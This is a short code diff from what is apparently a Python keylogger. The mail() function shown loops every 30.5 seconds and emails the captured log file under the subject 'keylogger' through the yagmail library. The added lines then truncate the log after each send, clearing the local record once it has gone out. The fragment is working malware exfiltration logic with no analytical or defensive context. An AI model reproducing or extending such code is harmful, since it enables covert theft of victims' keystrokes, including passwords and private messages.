@@ -43,7 +43,11 @@ def mail():
 	while True:
 		sleep(30.5)
 		yag.send(to=receiver,subject="keylogger",contents=body, attachments=filename,)
+		
 		print("sending")
+		sleep(1.5)
+		fi = open(path, 'r+')
+		fi.truncate(0)
 	
 	
 
